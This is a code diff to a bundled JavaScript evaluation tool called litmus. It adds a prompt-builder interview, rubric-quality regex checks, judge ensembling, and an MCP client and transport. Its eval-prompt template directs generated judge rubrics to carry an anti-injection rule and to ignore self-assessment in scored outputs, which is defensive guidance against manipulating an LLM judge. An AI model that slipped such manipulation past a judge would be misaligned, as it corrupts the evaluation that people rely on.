+    "- Keep the interview short \u2014 at most about 5 rounds, and prefer fewer. As soon as you can write a strong prompt, or the user asks you to generate, output the final system prompt and make reasonable assumptions for anything still unspecified.",
+    "",
+    "Respond with exactly one of these JSON shapes:",
+    '- To ask: {"kind":"question","message":string,"suggestions":string[]}',
+    '- To deliver: {"kind":"prompt","systemPrompt":string,"summary":string}',
+    "",
+    "The systemPrompt must be a complete, ready-to-use system prompt addressed to the model in the second person, with a clear role, behavior, output contract, and guardrails. The summary is one sentence on what you built and any assumptions you made."
+  ].join("\n");
+  var FORCE_GENERATE = 'Generate the final system prompt now from everything gathered so far. Make reasonable assumptions for anything unspecified. Respond with the {"kind":"prompt",...} shape.';
+  function buildBuilderMessages(conversation, forceGenerate = false) {
+    const messages = [{ role: "system", content: BUILDER_SYSTEM }, ...conversation];
+    if (forceGenerate) messages.push({ role: "user", content: FORCE_GENERATE });
+    return messages;
+  }
+  function parseBuilderTurn(text) {
+    const cleaned = text.replace(/```json/gi, "").replace(/```/g, "").trim();
+    const json = JSON.parse(cleaned);
+    return PromptBuilderTurnSchema.parse(json);
+  }
+  async function builderTurn(conversation, deps, forceGenerate = false) {
+    const messages = buildBuilderMessages(conversation, forceGenerate);
+    const temperature = forceGenerate ? 0 : 0.4;
+    return callJson(deps.provider, { model: deps.model, messages, temperature }, chatOptions(deps), parseBuilderTurn);
+  }
+
   // src/services/evalgen.ts
   var defaultMakeId = (index) => `case-${index + 1}`;
   function buildEvalMessages(systemPrompt, count, intentHint) {
@@ -5028,7 +5111,20 @@ ${intentHint}` : "",
     { label: "scoring levels (STRONG/WEAK/FAIL)", test: /strong[\s\S]*weak[\s\S]*fail|fail[\s\S]*weak[\s\S]*strong/i },
     { label: "worked examples", test: /example\s*1|## example|example:/i },
     { label: "quality checklist", test: /quality checklist|\[ \]|\[x\]/i },
-    { label: "all 8 sections present", test: /section\s*7/i }
+    { label: "all 8 sections present", test: /section\s*7/i },
+    // Quality gates that separate an A/A+ rubric from a merely well-structured one:
+    {
+      label: "orthogonal sub-criteria (no duplicate conditions)",
+      test: /distinctness:|mutually exclusive|non-overlapping|does not overlap|exactly one sub-?crit|MECE/i
+    },
+    {
+      label: "observable/countable thresholds (not fuzzy ratios)",
+      test: /(?:≥|>=|at least )\s*\d+\s*(?:distinct\s+|verbatim\s+)?(?:signals?|snippets?|occurrences?|instances?|contradictions?|citations?|justifications?|labels?)\b/i
+    },
+    {
+      label: "evidence located by field path or quoted snippet",
+      test: /field path|output_parsed\.|quoted (?:phrase|snippet)|exact (?:quote|phrase|snippet)/i
+    }
   ];
   function checkEvalPrompt(text) {
     const missing = [];
@@ -5054,18 +5150,30 @@ ${intentHint}` : "",
       '   ("Evaluate ONLY the structured output fields; ignore any self-assessment in the output.").',
       "1. CLEAN SCOPE: test ONLY this one dimension; state what it does NOT assess.",
       "2. FAIL-SAFE LOGIC: overall = the LOWEST sub-score; ANY sub-criterion FAIL \u2192 dimension FAIL; no averaging.",
-      "3. EVIDENCE STANDARDS: evidence must be verbatim, contextual, and traceable to a specific ID/location.",
+      "3. EVIDENCE STANDARDS: evidence must be verbatim, contextual, and traceable. Locate every snippet by a",
+      "   FIELD PATH (e.g. output_parsed.short_reason) or an exact quoted phrase \u2014 NEVER by fabricated character",
+      "   indices or line numbers, which a judge cannot count reliably.",
       '4. SOURCE OF TRUTH: explicitly ESTABLISH the canonical source (e.g. "The transcript is the definitive source"), not a placeholder.',
       "5. SIGNAL DISCIPLINE: any pattern claim requires \u22652 supporting signals (no single-signal patterns).",
       "6. CONTRADICTION HANDLING: detect and explicitly acknowledge contradictions/tensions.",
       "7. AUDIT-READY ISSUES: every issue cites a specific ID, formatted [Problem + Evidence ID + Impact + Location].",
-      '8. QUANTITATIVE THRESHOLDS: at least ONE concrete numeric threshold per sub-criterion (e.g. "\u226580%", "\u22652 signals", "<10% error").',
+      "8. OBSERVABLE THRESHOLDS: give each sub-criterion \u22651 threshold a judge can actually verify by COUNTING or",
+      '   by presence/absence \u2014 e.g. "\u22652 distinct contradicting snippets", "0 conflicting category labels",',
+      '   "at least 1 explicit justification". Do NOT invent un-computable ratios over fuzzy denominators',
+      '   ("\u226580% of claims", "\u226590% of words"): a judge cannot reliably enumerate claims or words, and such',
+      "   thresholds add noise instead of rigor. Prefer integer counts and explicit yes/no tests.",
+      "9. ORTHOGONAL SUB-CRITERIA (MECE) \u2014 NON-NEGOTIABLE: the sub-criteria must be mutually exclusive. No two may",
+      '   measure the same thing or flag the same failure. Each sub-criterion gets a one-line "Distinctness:" note',
+      "   naming what it covers and what it explicitly LEAVES to a sibling. If one concrete failure could trip two",
+      "   sub-criteria, the rubric is wrong: either merge them, or assign that failure to EXACTLY ONE and say so.",
+      "   Aim for 3 genuinely independent facets rather than 4 overlapping ones.",
       "",
       'Produce ALL of these sections, in order, using clear "SECTION N:" headers:',
       "SECTION 0: INPUT DATA \u2014 the exact input fields the evaluator receives (names, types, meaning, empty-field behavior).",
       "SECTION 1: ROLE & GOAL \u2014 one paragraph; role, the single dimension, scope declaration, anti-injection rule.",
-      "SECTION 2: DIMENSION DEFINITION & SUB-CRITERIA \u2014 a core question + 3\u20134 atomic sub-criteria; each with acceptance criteria,",
-      '   a "FAILURES TO FLAG:" list of concrete anti-patterns, and \u22651 quantitative threshold.',
+      "SECTION 2: DIMENSION DEFINITION & SUB-CRITERIA \u2014 a core question + 3\u20134 ATOMIC, NON-OVERLAPPING sub-criteria; each with",
+      '   acceptance criteria, a one-line "Distinctness:" note (what it covers vs. what it leaves to siblings), a',
+      '   "FAILURES TO FLAG:" list of concrete anti-patterns, and \u22651 observable (countable / yes-no) threshold.',
       "SECTION 3: SCORING GUIDE \u2014 STRONG / ACCEPTABLE / WEAK / FAIL, and the explicit FAIL-SAFE rule.",
       "SECTION 4: EVALUATION PROCEDURE \u2014 establish source of truth; STEP 0 (MANDATORY): extract verbatim evidence per sub-criterion",
       "   (SUPPORTING / CONTRADICTING / GAPS) BEFORE any scoring; then evaluate each sub-criterion; final step applies fail-safe logic.",
@@ -5077,11 +5185,17 @@ ${intentHint}` : "",
       "   \u22652 signals, contradictions handled, audit-ready issues, specific & actionable, evidence extracted before scoring).",
       "",
       'Use enforcement language ("FAILURES TO FLAG:", not "check for failures"). Use concrete examples, never generic placeholders like "john" or "example_id".',
+      "",
+      "BEFORE YOU OUTPUT \u2014 SELF-REVIEW (do this silently, then emit only the final prompt):",
+      '- For every pair of sub-criteria, ask "could one real failure be flagged by both?" If yes, merge them or',
+      '  move the failure to exactly one and update the "Distinctness:" notes. Ship no duplicate eval conditions.',
+      "- Replace any threshold you could not compute by hand (ratios over claims/words) with a countable one.",
+      "- Confirm every evidence location is a field path or quoted phrase, not a character index.",
       analysisHint2 ? `
 Analysis of the system prompt to ground you:
 ${analysisHint2}` : "",
       feedback ? `
-Your previous draft was incomplete. FIX IT by adding: ${feedback}` : "",
+Your previous draft fell short. FIX IT by addressing: ${feedback}` : "",
       "",
       "Output ONLY the evaluation prompt text \u2014 no preamble, no markdown fences."
     ].join("\n");
@@ -5090,7 +5204,7 @@ Your previous draft was incomplete. FIX IT by adding: ${feedback}` : "",
       { role: "user", content: systemPrompt }
     ];
   }
-  async function generateEvalPrompt(systemPrompt, dimension, deps, analysisHint2, maxAttempts = 1) {
+  async function generateEvalPrompt(systemPrompt, dimension, deps, analysisHint2, maxAttempts = 2) {
     let best = "";
     let bestScore = -1;
     let feedback;
@@ -5176,7 +5290,7 @@ ${text}`).join("\n\n");
   function stdDev(values) {
     if (values.length < 2) return 0;
     const m = mean(values);
-    const variance = mean(values.map((v) => (v - m) ** 2));
+    const variance = mean(values.map((v2) => (v2 - m) ** 2));
     return Math.sqrt(variance);
   }
   function consistency(repeatScores) {
@@ -5190,7 +5304,74 @@ ${text}`).join("\n\n");
     return { gap, rating };
   }
 
+  // src/core/judgeAggregate.ts
+  function median(values) {
+    const sorted = [...values].sort((a, b) => a - b);
+    const mid = Math.floor(sorted.length / 2);
+    const m = sorted.length % 2 === 0 ? (sorted[mid - 1] + sorted[mid]) / 2 : sorted[mid];
+    return round1(m);
+  }
+  function stdev(values, mean2) {
+    const variance = values.reduce((a, v2) => a + (v2 - mean2) ** 2, 0) / values.length;
+    return round1(Math.sqrt(variance));
+  }
+  function aggregateDimensions(verdicts) {
+    const order = [];
+    const byDim = /* @__PURE__ */ new Map();
+    for (const v2 of verdicts) {
+      for (const d of v2.dimensions ?? []) {
+        if (!byDim.has(d.dimension)) {
+          byDim.set(d.dimension, []);
+          order.push(d.dimension);
+        }
+        byDim.get(d.dimension).push(d.score);
+      }
+    }
+    if (order.length === 0) return void 0;
+    return order.map((dimension) => ({ dimension, score: median(byDim.get(dimension)) }));
+  }
+  function aggregateVerdicts(verdicts) {
+    const first = verdicts[0];
+    if (!first) throw new Error("aggregateVerdicts: no verdicts");
+    if (verdicts.length === 1) {
+      return first.dimensions ? { score: first.score, rationale: first.rationale, dimensions: first.dimensions } : { score: first.score, rationale: first.rationale };
+    }
+    const scores = verdicts.map((v2) => v2.score);
+    const score = median(scores);
+    const min = Math.min(...scores);
+    const max = Math.max(...scores);
+    const mean2 = scores.reduce((a, s2) => a + s2, 0) / scores.length;
+    const spread = { count: scores.length, scores, min, max, stdev: stdev(scores, mean2) };
+    const agreement = min === max ? `judges agreed at ${score}` : `${verdicts.length} judges: median ${score} (${min}\u2013${max}, \u03C3${spread.stdev})`;
+    const dimensions = aggregateDimensions(verdicts);
+    return {
+      score,
+      rationale: `${first.rationale} \xB7 ${agreement}`,
+      ...dimensions ? { dimensions } : {},
+      spread
+    };
+  }
+
+  // src/shared/concurrency.ts
+  async function mapWithConcurrency(items, limit, fn) {
+    const n = items.length;
+    const results = new Array(n);
+    const cap = Math.max(1, Math.floor(limit));
+    let next = 0;
+    async function worker() {
+      for (; ; ) {
+        const i = next++;
+        if (i >= n) return;
+        results[i] = await fn(items[i], i);
+      }
+    }
+    await Promise.all(Array.from({ length: Math.min(cap, n) }, () => worker()));
+    return results;
+  }
+
   // src/services/judge.ts
+  var JUDGE_ENSEMBLE_CONCURRENCY = 3;
+  var DEFAULT_ENSEMBLE_TEMPERATURE = 0.4;
   function buildJudgeMessages(systemPrompt, caseInput, output, rubric) {
     const base = rubric ? [
       "You are litmus, an impartial output judge. Apply the EVALUATION RUBRIC below to score the",
@@ -5229,13 +5410,27 @@ ${output}`
     const json = JSON.parse(cleaned);
     return VerdictSchema.parse(json);
   }
-  async function judgeOutput(systemPrompt, caseInput, output, deps) {
+  function judgeOnce(systemPrompt, caseInput, output, deps, temperature) {
     return callJson(
       deps.provider,
-      { model: deps.model, messages: buildJudgeMessages(systemPrompt, caseInput, output, deps.rubric), temperature: 0 },
+      { model: deps.model, messages: buildJudgeMessages(systemPrompt, caseInput, output, deps.rubric), temperature },
       chatOptions(deps),
       parseVerdict
     );
+  }
+  async function judgeOutput(systemPrompt, caseInput, output, deps) {
+    return judgeOnce(systemPrompt, caseInput, output, deps, 0);
+  }
+  async function judgeOutputEnsemble(systemPrompt, caseInput, output, deps) {
+    const samples = Math.max(1, Math.floor(deps.judgeSamples ?? 1));
+    if (samples === 1) return aggregateVerdicts([await judgeOutput(systemPrompt, caseInput, output, deps)]);
+    const temperature = deps.judgeTemperature ?? DEFAULT_ENSEMBLE_TEMPERATURE;
+    const verdicts = await mapWithConcurrency(
+      Array.from({ length: samples }, (_, i) => i),
+      JUDGE_ENSEMBLE_CONCURRENCY,
+      () => judgeOnce(systemPrompt, caseInput, output, deps, temperature)
+    );
+    return aggregateVerdicts(verdicts);
   }
 
   // src/services/rubricValidation.ts
@@ -5294,11 +5489,11 @@ ${output}`
   }
 
   // src/services/toolAssert.ts
-  function jsonTypeOf(v) {
-    if (v === null) return "null";
-    if (Array.isArray(v)) return "array";
-    const t = typeof v;
-    if (t === "number") return Number.isInteger(v) ? "integer" : "number";
+  function jsonTypeOf(v2) {
+    if (v2 === null) return "null";
+    if (Array.isArray(v2)) return "array";
+    const t = typeof v2;
+    if (t === "number") return Number.isInteger(v2) ? "integer" : "number";
     if (t === "string" || t === "boolean" || t === "object") return t;
     return "null";
   }
@@ -5333,9 +5528,9 @@ ${output}`
     if (jsonTypeOf(args) !== "object") return ["expected arguments object for requiredArgs check"];
     const obj = args;
     const problems = [];
-    for (const [k, v] of Object.entries(required)) {
+    for (const [k, v2] of Object.entries(required)) {
       if (!(k in obj)) problems.push(`required argument "${k}" was not provided`);
-      else if (!deepEqual(obj[k], v)) problems.push(`argument "${k}" should equal ${JSON.stringify(v)}, got ${JSON.stringify(obj[k])}`);
+      else if (!deepEqual(obj[k], v2)) problems.push(`argument "${k}" should equal ${JSON.stringify(v2)}, got ${JSON.stringify(obj[k])}`);
     }
     return problems;
   }
@@ -5377,8 +5572,16 @@ ${output}`
   function resultToContent(r) {
     return "error" in r ? JSON.stringify({ error: r.error }) : JSON.stringify(r.value ?? {});
   }
-  async function runAgent(systemPrompt, scenario, step, signal) {
+  function defaultMockResolver(scenario) {
     const toolsByName = new Map(scenario.tools.map((t) => [t.name, t]));
+    return (call, perToolIndex) => {
+      const tool = toolsByName.get(call.name);
+      const { result, known } = mockRespond(tool, perToolIndex);
+      const argsValid = known && tool ? validateArgsSchema(call.arguments, tool.parameters).length === 0 : false;
+      return { name: call.name, result, known, argsValid };
+    };
+  }
+  async function runAgent(systemPrompt, scenario, step, signal, resolver = defaultMockResolver(scenario)) {
     const callCounts = /* @__PURE__ */ new Map();
     const turns = [
       { role: "system", content: systemPrompt },
@@ -5387,20 +5590,18 @@ ${output}`
     const steps = [];
     for (let i = 0; i < scenario.maxSteps; i++) {
       if (signal?.aborted) return { steps, finalText: "", stopReason: "aborted" };
-      const { text, toolCalls } = await step(turns);
+      const { text, toolCalls, timing } = await step(turns);
       if (toolCalls.length === 0) {
-        steps.push({ modelText: text, toolCalls: [], toolResults: [] });
+        steps.push({ modelText: text, toolCalls: [], toolResults: [], ...timing ? { timing } : {} });
         return { steps, finalText: text, stopReason: "final" };
       }
-      const toolResults = toolCalls.map((c) => {
+      const toolResults = [];
+      for (const c of toolCalls) {
         const n = callCounts.get(c.name) ?? 0;
         callCounts.set(c.name, n + 1);
-        const tool = toolsByName.get(c.name);
-        const { result, known } = mockRespond(tool, n);
-        const argsValid = known && tool ? validateArgsSchema(c.arguments, tool.parameters).length === 0 : false;
-        return { name: c.name, result, known, argsValid };
-      });
-      steps.push({ modelText: text, toolCalls, toolResults });
+        toolResults.push(await resolver(c, n));
+      }
+      steps.push({ modelText: text, toolCalls, toolResults, ...timing ? { timing } : {} });
       turns.push({ role: "assistant", content: text, toolCalls });
       for (const tr of toolResults) turns.push({ role: "tool", toolName: tr.name, content: resultToContent(tr.result) });
     }
@@ -5412,13 +5613,13 @@ ${output}`
     if (trajectory.stopReason === "max_steps") return { passed: false, reason: `hit the ${scenario.maxSteps}-step cap without finishing` };
     const need = scenario.successContains ?? [];
     const text = trajectory.finalText.toLowerCase();
-    const missing = need.filter((s) => !text.includes(s.toLowerCase()));
+    const missing = need.filter((s2) => !text.includes(s2.toLowerCase()));
     if (missing.length > 0) return { passed: false, reason: `final answer missing: ${missing.join(", ")}` };
     return { passed: true, reason: "reached the goal" };
   }
   function scoreScenario(trajectory, scenario) {
     const goal = reachedGoal(trajectory, scenario);
-    const results = trajectory.steps.flatMap((s) => s.toolResults);
+    const results = trajectory.steps.flatMap((s2) => s2.toolResults);
     const unknown = results.filter((r) => !r.known);
     const errors = results.filter((r) => "error" in r.result);
     const badArgs = results.filter((r) => !r.argsValid);
@@ -5460,8 +5661,268 @@ ${output}`
         { model: deps.model, messages: toChatMessages(turns), tools: deps.tools },
         chatOptions(deps)
       );
-      return { text: res.text, toolCalls: res.toolCalls ?? [] };
+      return { text: res.text, toolCalls: res.toolCalls ?? [], timing: res.timing };
     };
+  }
+
+  // src/services/toolResolver.ts
+  function mcpResolver(client, tools) {
+    const schemaByName = new Map(tools.map((t) => [t.name, t.inputSchema]));
+    return async (call) => {
+      const schema = schemaByName.get(call.name);
+      const known = schema !== void 0;
+      const argsValid = known ? validateArgsSchema(call.arguments, schema).length === 0 : false;
+      if (!known) {
+        return { name: call.name, result: { error: "unknown tool (not in server catalog)" }, known, argsValid };
+      }
+      try {
+        const res = await client.callTool(call.name, call.arguments);
+        const result = res.isError ? { error: res.text || "tool reported an error" } : { value: res.text };
+        return { name: call.name, result, known, argsValid };
+      } catch (err) {
+        const message = err instanceof Error ? err.message : String(err);
+        return { name: call.name, result: { error: message }, known, argsValid };
+      }
+    };
+  }
+
+  // src/mcp/jsonrpc.ts
+  function createIdSource() {
+    let n = 0;
+    return () => n += 1;
+  }
+  function makeRequest(id, method, params) {
+    return params === void 0 ? { jsonrpc: "2.0", id, method } : { jsonrpc: "2.0", id, method, params };
+  }
+  function makeNotification(method, params) {
+    return params === void 0 ? { jsonrpc: "2.0", method } : { jsonrpc: "2.0", method, params };
+  }
+  function isJsonRpcResponse(v2) {
+    if (typeof v2 !== "object" || v2 === null) return false;
+    const o = v2;
+    return o["jsonrpc"] === "2.0" && "id" in o && ("result" in o || "error" in o);
+  }
+  var JsonRpcCallError = class extends Error {
+    constructor(method, rpc) {
+      super(`[${method}] JSON-RPC ${rpc.code}: ${rpc.message}`);
+      this.method = method;
+      this.rpc = rpc;
+      this.name = "JsonRpcCallError";
+    }
+  };
+  function unwrap(method, res) {
+    if (res.error) throw new JsonRpcCallError(method, res.error);
+    return res.result;
+  }
+
+  // src/mcp/transport.ts
+  var McpTransportError = class extends Error {
+    constructor(status2, detail) {
+      super(`MCP transport HTTP ${status2}: ${detail.slice(0, 200)}`);
+      this.status = status2;
+      this.name = "McpTransportError";
+    }
+  };
+  var HttpTransport = class {
+    constructor(config, deps) {
+      this.config = config;
+      this.deps = deps;
+      this.fetchImpl = deps.fetchImpl ?? defaultFetch();
+    }
+    sessionId;
+    fetchImpl;
+    headers() {
+      const accept = this.config.transport === "sse" ? "text/event-stream" : "application/json, text/event-stream";
+      const h = { "content-type": "application/json", accept };
+      if (this.config.authHeader) h["authorization"] = this.config.authHeader;
+      if (this.sessionId) h["mcp-session-id"] = this.sessionId;
+      if (this.deps.protocolVersion) h["mcp-protocol-version"] = this.deps.protocolVersion;
+      return h;
+    }
+    captureSession(res) {
+      const id = res.headers?.get("mcp-session-id");
+      if (id) this.sessionId = id;
+    }
+    async request(req) {
+      const res = await this.post(JSON.stringify(req));
+      this.captureSession(res);
+      const ctype = res.headers?.get("content-type") ?? "";
+      const msg2 = ctype.includes("text/event-stream") ? await this.readFromStream(res, req.id) : await this.readFromJson(res);
+      if (!msg2) throw new McpTransportError(res.status, `no JSON-RPC response for id ${req.id}`);
+      return msg2;
+    }
+    async notify(n) {
+      const res = await this.post(JSON.stringify(n));
+      this.captureSession(res);
+      await res.text().catch(() => "");
+    }
+    async post(body) {
+      const res = await this.fetchImpl(this.config.url, {
+        method: "POST",
+        headers: this.headers(),
+        body,
+        ...this.deps.signal ? { signal: this.deps.signal } : {}
+      });
+      if (!res.ok) {
+        const detail = await res.text().catch(() => "");
+        throw new McpTransportError(res.status, detail);
+      }
+      return res;
+    }
+    async readFromJson(res) {
+      const text = await res.text();
+      const parsed = safeParse(text);
+      return isJsonRpcResponse(parsed) ? parsed : null;
+    }
+    async readFromStream(res, id) {
+      if (!res.body) return null;
+      for await (const payload of iterateSSE(res.body)) {
+        const parsed = safeParse(payload);
+        if (isJsonRpcResponse(parsed) && parsed.id === id) return parsed;
+      }
+      return null;
+    }
+  };
+  function safeParse(text) {
+    try {
+      return JSON.parse(text);
+    } catch {
+      return null;
+    }
+  }
+  function createTransport(config, deps = {}) {
+    return new HttpTransport(config, deps);
+  }
+
+  // src/mcp/schema.ts
+  var CapabilityFlagsSchema = external_exports.object({
+    tools: external_exports.unknown().optional(),
+    resources: external_exports.unknown().optional(),
+    prompts: external_exports.unknown().optional()
+  }).passthrough();
+  var InitializeResultSchema = external_exports.object({
+    protocolVersion: external_exports.string().min(1),
+    capabilities: CapabilityFlagsSchema.default({}),
+    serverInfo: external_exports.object({ name: external_exports.string().default("unknown"), version: external_exports.string().default("0.0.0") }).default({ name: "unknown", version: "0.0.0" })
+  }).passthrough();
+  var ToolDescriptorSchema = external_exports.object({
+    name: external_exports.string().min(1),
+    description: external_exports.string().optional(),
+    // Servers send `inputSchema`; default to an open object when absent.
+    inputSchema: external_exports.record(external_exports.unknown()).default({ type: "object" })
+  }).passthrough();
+  var ToolsListResultSchema = external_exports.object({ tools: external_exports.array(ToolDescriptorSchema).default([]) }).passthrough();
+  var ResourceSchema = external_exports.object({
+    uri: external_exports.string().min(1),
+    name: external_exports.string().optional(),
+    description: external_exports.string().optional(),
+    mimeType: external_exports.string().optional()
+  }).passthrough();
+  var ResourcesListResultSchema = external_exports.object({ resources: external_exports.array(ResourceSchema).default([]) }).passthrough();
+  var PromptArgSchema = external_exports.object({ name: external_exports.string().min(1), description: external_exports.string().optional(), required: external_exports.boolean().optional() }).passthrough();
+  var PromptSchema = external_exports.object({
+    name: external_exports.string().min(1),
+    description: external_exports.string().optional(),
+    arguments: external_exports.array(PromptArgSchema).optional()
+  }).passthrough();
+  var PromptsListResultSchema = external_exports.object({ prompts: external_exports.array(PromptSchema).default([]) }).passthrough();
+  var ContentBlockSchema = external_exports.object({ type: external_exports.string(), text: external_exports.string().optional() }).passthrough();
+  var CallToolResultSchema = external_exports.object({ content: external_exports.array(ContentBlockSchema).default([]), isError: external_exports.boolean().default(false) }).passthrough();
+  function toHandshake(result, sessionId) {
+    const r = InitializeResultSchema.parse(result);
+    const capabilities = {
+      tools: r.capabilities.tools !== void 0,
+      resources: r.capabilities.resources !== void 0,
+      prompts: r.capabilities.prompts !== void 0
+    };
+    return {
+      protocolVersion: r.protocolVersion,
+      capabilities,
+      serverInfo: { name: r.serverInfo.name, version: r.serverInfo.version },
+      ...sessionId ? { sessionId } : {}
+    };
+  }
+  function toToolDescriptors(result) {
+    return ToolsListResultSchema.parse(result).tools.map((t) => ({
+      name: t.name,
+      ...t.description ? { description: t.description } : {},
+      inputSchema: t.inputSchema
+    }));
+  }
+  function toResources(result) {
+    return ResourcesListResultSchema.parse(result).resources.map((r) => ({
+      uri: r.uri,
+      ...r.name ? { name: r.name } : {},
+      ...r.description ? { description: r.description } : {},
+      ...r.mimeType ? { mimeType: r.mimeType } : {}
+    }));
+  }
+  function toPrompts(result) {
+    return PromptsListResultSchema.parse(result).prompts.map((p) => ({
+      name: p.name,
+      ...p.description ? { description: p.description } : {},
+      ...p.arguments ? { arguments: p.arguments } : {}
+    }));
+  }
+  function toCallResult(result) {
+    const r = CallToolResultSchema.parse(result);
+    const text = r.content.map((c) => c.type === "text" && typeof c.text === "string" ? c.text : "").filter(Boolean).join("\n");
+    return { isError: r.isError, text, content: r.content };
+  }
+
+  // src/mcp/client.ts
+  var CLIENT_PROTOCOL_VERSION = "2025-06-18";
+  var CLIENT_INFO = { name: "litmus", version: "1.1.0" };
+  var McpClient = class {
+    constructor(transport) {
+      this.transport = transport;
+    }
+    nextId = createIdSource();
+    handshake;
+    /** Run the initialize handshake. Idempotent — returns the cached result if already connected. */
+    async connect() {
+      if (this.handshake) return this.handshake;
+      const res = await this.transport.request(
+        makeRequest(this.nextId(), "initialize", {
+          protocolVersion: CLIENT_PROTOCOL_VERSION,
+          capabilities: {},
+          clientInfo: CLIENT_INFO
+        })
+      );
+      const result = unwrap("initialize", res);
+      this.handshake = toHandshake(result, this.transport.sessionId);
+      await this.transport.notify(makeNotification("notifications/initialized"));
+      return this.handshake;
+    }
+    /** The negotiated handshake; throws if `connect()` has not run. */
+    get capabilities() {
+      if (!this.handshake) throw new Error("McpClient: connect() must be called before use");
+      return this.handshake;
+    }
+    async listTools() {
+      return toToolDescriptors(await this.call("tools/list"));
+    }
+    async listResources() {
+      return toResources(await this.call("resources/list"));
+    }
+    async listPrompts() {
+      return toPrompts(await this.call("prompts/list"));
+    }
+    async callTool(name, args) {
+      return toCallResult(await this.call("tools/call", { name, arguments: args ?? {} }));
+    }
+    async call(method, params) {
+      const res = await this.transport.request(makeRequest(this.nextId(), method, params));
+      return unwrap(method, res);
+    }
+  };
+  function connectMcp(config, deps = {}) {
+    const transport = createTransport(config, {
+      ...deps.fetchImpl ? { fetchImpl: deps.fetchImpl } : {},
+      ...deps.signal ? { signal: deps.signal } : {},
+      protocolVersion: CLIENT_PROTOCOL_VERSION
+    });
+    return new McpClient(transport);
   }
 
   // src/core/results.ts
@@ -5475,7 +5936,7 @@ ${output}`
     if (runs.length === 1) return first;
     const scores = runs.map((r) => r.score);
     const mean2 = round1(scores.reduce((a, b) => a + b, 0) / scores.length);
-    const variance = scores.reduce((a, s) => a + (s - mean2) ** 2, 0) / scores.length;
+    const variance = scores.reduce((a, s2) => a + (s2 - mean2) ** 2, 0) / scores.length;
     const passRate = runs.filter((r) => scorePasses(r.score, threshold)).length / runs.length;
     const stats = {
       count: runs.length,
@@ -5534,32 +5995,52 @@ ${output}`
   }
   async function scenarioCaseResult(systemPrompt, evalCase, deps) {
     const scenario = evalCase.scenario;
-    const tools = scenario.tools.map((t) => ({
-      name: t.name,
-      ...t.description ? { description: t.description } : {},
-      parameters: t.parameters
-    }));
+    const wired = scenario.mcpServerId ? await wireMcp(scenario.mcpServerId, deps) : { tools: mockToolDefs(scenario), resolver: void 0 };
     const step = providerStep({
       provider: deps.targetProvider,
       apiKey: deps.targetKey,
       model: deps.target.model,
-      tools,
+      tools: wired.tools,
       fetchImpl: deps.fetchImpl,
       clock: deps.clock,
       signal: deps.signal
     });
-    const trajectory = await runAgent(systemPrompt, scenario, step, deps.signal);
+    const trajectory = await runAgent(systemPrompt, scenario, step, deps.signal, wired.resolver);
     const verdict = scoreScenario(trajectory, scenario);
+    const turnTimings = trajectory.steps.map((s2) => s2.timing).filter((t) => t !== void 0);
     return {
       caseId: evalCase.id,
       output: JSON.stringify(trajectory),
       score: verdict.score,
       passed: verdict.passed,
       rationale: verdict.rationale,
-      timing: ZERO_TIMING,
-      // multi-turn timing isn't aggregated yet
+      timing: aggregateTrajectoryTiming(turnTimings),
+      // summed across turns (ADR 0002)
       dimensions: verdict.dimensions
     };
+  }
+  function mockToolDefs(scenario) {
+    return scenario.tools.map((t) => ({
+      name: t.name,
+      ...t.description ? { description: t.description } : {},
+      parameters: t.parameters
+    }));
+  }
+  async function wireMcp(serverId, deps) {
+    const config = (deps.mcpServers ?? []).find((s2) => s2.id === serverId);
+    if (!config) throw new Error(`MCP server "${serverId}" is not configured`);
+    const client = connectMcp(config, {
+      ...deps.fetchImpl ? { fetchImpl: deps.fetchImpl } : {},
+      ...deps.signal ? { signal: deps.signal } : {}
+    });
+    await client.connect();
+    const discovered = await client.listTools();
+    const tools = discovered.map((t) => ({
+      name: t.name,
+      ...t.description ? { description: t.description } : {},
+      parameters: t.inputSchema
+    }));
+    return { tools, resolver: mcpResolver(client, discovered) };
   }
   async function runOneCase(systemPrompt, evalCase, deps) {
     const threshold = deps.passThreshold ?? DEFAULT_PASS_THRESHOLD;
@@ -5578,11 +6059,13 @@ ${output}`
         chatOptions({ apiKey: deps.targetKey, fetchImpl: deps.fetchImpl, clock: deps.clock, signal: deps.signal })
       );
       if (isToolCase) return toolCaseResult(evalCase, generated, deps);
-      const verdict = await judgeOutput(systemPrompt, evalCase.input, generated.text, {
+      const verdict = await judgeOutputEnsemble(systemPrompt, evalCase.input, generated.text, {
         provider: deps.judgeProvider,
         apiKey: deps.judgeKey,
         model: deps.judgeModel,
         rubric: deps.rubric,
+        judgeSamples: deps.judgeSamples,
+        judgeTemperature: deps.judgeTemperature,
         fetchImpl: deps.fetchImpl,
         clock: deps.clock,
         signal: deps.signal
@@ -5607,15 +6090,20 @@ ${output}`
       };
     }
   }
+  async function runCaseSampled(systemPrompt, evalCase, deps, samples, threshold) {
+    const runs = [];
+    for (let s2 = 0; s2 < samples; s2++) runs.push(await runOneCase(systemPrompt, evalCase, deps));
+    return foldSamples(runs, threshold);
+  }
   async function runEval(systemPrompt, cases, deps) {
     const threshold = deps.passThreshold ?? DEFAULT_PASS_THRESHOLD;
     const samples = Math.max(1, Math.floor(deps.samples ?? 1));
-    const results = [];
-    for (const evalCase of cases) {
-      const runs = [];
-      for (let s = 0; s < samples; s++) runs.push(await runOneCase(systemPrompt, evalCase, deps));
-      results.push(foldSamples(runs, threshold));
-    }
+    const concurrency = Math.max(1, Math.floor(deps.concurrency ?? 1));
+    const results = await mapWithConcurrency(
+      cases,
+      concurrency,
+      (evalCase) => runCaseSampled(systemPrompt, evalCase, deps, samples, threshold)
+    );
     return { results, summary: summarizeRun(results, threshold) };
   }
 
@@ -5726,7 +6214,10 @@ ${systemPrompt}`,
     if (input.includeAnalysis) add(input.analyzerModel, 1);
     if (input.includeEvalGen) add(input.analyzerModel, 1);
     add(input.targetModel, caseCount);
-    add(input.judgeModel, caseCount);
+    if (input.includeJudge !== false) {
+      const judgeSamples = Math.max(1, Math.floor(input.judgeSamples ?? 1));
+      add(input.judgeModel, caseCount * judgeSamples);
+    }
     if (input.includeFixes) add(input.analyzerModel, 1);
     return { totalCalls: calls, estUsd: roundUsd(usd) };
   }
@@ -5738,7 +6229,7 @@ ${systemPrompt}`,
   }
 
   // src/core/dimensions.ts
-  function aggregateDimensions(results) {
+  function aggregateDimensions2(results) {
     const byName = /* @__PURE__ */ new Map();
     for (const r of results) {
       for (const d of r.dimensions ?? []) {
@@ -5751,6 +6242,20 @@ ${systemPrompt}`,
   }
 
   // src/core/litmusAxis.ts
+  function describeComparison(a, b) {
+    const samePrompt = a.promptText === b.promptText;
+    const modelChanged = Boolean(a.model && b.model && a.model !== b.model);
+    if (samePrompt && modelChanged) {
